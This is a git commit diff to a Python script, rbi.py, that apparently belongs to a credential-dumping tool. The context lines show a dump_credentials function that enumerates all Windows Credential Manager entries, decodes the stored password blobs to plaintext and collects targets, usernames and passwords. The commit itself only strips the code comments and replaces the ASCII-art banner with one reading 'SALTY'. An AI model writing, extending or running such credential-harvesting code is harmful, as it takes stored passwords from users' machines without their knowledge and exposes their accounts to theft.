29c59f55d787f9223b249a8c60056827b9f07789
Salty <92469140+saltX5@users.noreply.github.com>
2024-12-21 14:38:31 +0530

    Update rbi.py

--- rbi.py
+++ rbi.py
@@ -3,7 +3,7 @@ import os
 
 def dump_credentials():
     try:
-        # Retrieve all stored credentials from the Windows Credential Manager
+       
         creds = win32cred.CredEnumerate(None, 0)
         
         if not creds:
@@ -11,14 +11,14 @@ def dump_credentials():
         
         credentials = ""
         
-        # Loop through and print out the credentials
+       
         for cred in creds:
             target_name = cred.get('TargetName')
             username = cred.get('UserName')
             password = cred.get('CredentialBlob')
 
             if password:
-                # Convert password from bytes to string
+               
                 password = password.decode('utf-8', errors='ignore')
             
             credentials += f"Target: {target_name}\n"
@@ -34,12 +34,16 @@ def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     
     ascii_art = """
-  _____  ____   __
- |  __ \|  _ \ / /
- | |__) | |_) | | 
- |  _  /|  _ <| | 
- | | \ \| |_) | | 
- |_|  \_\____/|_|
+
+ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░    ░▒▓██████▓▒░░▒▓███████▓▒░  
+       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
+       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+                                                                             
+                                                                             
                      
     """
     print(ascii_art)
